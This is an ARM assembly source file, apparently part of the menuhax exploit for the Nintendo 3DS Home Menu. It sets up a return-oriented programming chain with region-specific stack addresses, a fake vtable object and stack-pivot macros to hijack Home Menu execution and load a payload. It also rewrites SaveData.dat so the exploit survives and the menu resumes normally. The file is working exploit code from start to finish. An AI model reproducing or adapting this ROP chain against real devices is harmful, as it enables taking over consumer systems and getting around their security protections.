.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#if REGIONVAL!=4//non-KOR
#define SDICONHAX_SPRETADDR (0x0ffffe20 - (6*4)) //SP address right before the original stack-pivot was done.
#else//KOR
#define SDICONHAX_SPRETADDR (0x0ffffe18 - (6*4))
#endif

_start:

ropstackstart:

@ *(saved_r4+0x0) = <value setup by menuhax_manager>, aka the original address for the first objptr.
ROPMACRO_LDDRR0_ADDR1_STRVALUE SDICONHAX_SPRETADDR, 0x0, (0x58414800 + 0x00)

@ *(saved_r4+0x4) = <value setup by menuhax_manager>, aka the original address for the second objptr.
ROPMACRO_LDDRR0_ADDR1_STRVALUE SDICONHAX_SPRETADDR, 0x4, (0x58414800 + 0x01)

@ Subtract the saved r4 on stack by 4. This results in the current objptr in the target_objectslist_buffer being reprocessed @ RET2MENU.
ROPMACRO_LDDRR0_ADDR1_STRADDR SDICONHAX_SPRETADDR, SDICONHAX_SPRETADDR, 0xfffffffc

#include "menuhax_loader.s"

@ The ROP used for RET2MENU starts here.

@ Open the SaveData.dat file for writing. This blocks the actual Home Menu code from reading/writing SaveData.dat, since fsuser doesn't allow accessing files which are currently open for writing.
CALLFUNC_NOSP IFile_Open, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(savedatadat_filepath), 0x2, 0

ROPMACRO_STACKPIVOT SDICONHAX_SPRETADDR, POP_R4R8PC @ Return to executing the original homemenu code.

menuhaxloader_beforethreadexit:
//Don't write icon-related data, because: 1) It's all reset to the default data anyway, when the icon data was actually updated. 2) The haxx doesn't trigger at next process boot, and as a result the haxx ends up getting wiped too.
/*@ Write to FS savedatadat+0, stopping where the haxx TID-data is.
CALLFUNC IFile_Write, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(tmp_scratchdata), (0x58480000), 300*8 + 0x8, 1, 0, 0, 0

@ Seek to the start of <some icon(?) array>, then write the whole array since no haxx-data is stored here.
CALLFUNC IFile_Seek, ROPBUFLOC(savedatadat_filectx), 0, 0xb48, 0, 0, 0, 0, 0
CALLFUNC IFile_Write, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(tmp_scratchdata), (0x58480000  + 0xb48), 360, 1, 0, 0, 0

@ Write the data prior to the haxx-data for the s16 array.
CALLFUNC IFile_Write, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(tmp_scratchdata), (0x58480000  + 0xcb0), 300*2, 1, 0, 0, 0

@ Seek to the start of <some icon(?) array>, then write the whole array since no haxx-data is stored here.
CALLFUNC IFile_Seek, ROPBUFLOC(savedatadat_filectx), 0, 0xe18, 0, 0, 0, 0, 0
CALLFUNC IFile_Write, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(tmp_scratchdata), (0x58480000 + 0xe18), 360, 1, 0, 0, 0

@ Write the data prior to the haxx-data, for the s8 array.
CALLFUNC IFile_Write, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(tmp_scratchdata), (0x58480000 + 0xf80), 300, 1, 0, 0, 0*/

@ Write the rest of the data to FS.
CALLFUNC IFile_Seek, ROPBUFLOC(savedatadat_filectx), 0, 0x10e8, 0, 0, 0, 0, 0
CALLFUNC IFile_Write, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(tmp_scratchdata), (0x58480000 + 0x10e8), 0x2da0 - 0x10e8, 1, 0, 0, 0

ROPMACRO_IFile_Close ROPBUFLOC(savedatadat_filectx)

@ Copy the addr from menuhax_payload beforethreadexit_return_spaddr to the word which will be popped into sp.
ROPMACRO_COPYWORD ROPBUFLOC(stackpivot_sploadword), MENUHAXLOADER_LOAD_BINADDR+12

@ Write to the word which will be popped into pc.
ROPMACRO_WRITEWORD ROPBUFLOC(stackpivot_pcloadword), ROP_POPPC

ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP

ROPMACRO_STACKPIVOT_JUMP

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word 0//ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word 0//STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.

savedatadat_filectx:
.space 0x20

savedatadat_filepath:
.string16 "EXT:/SaveData.dat"
.align 2

tmp_scratchdata:
.space 0x4

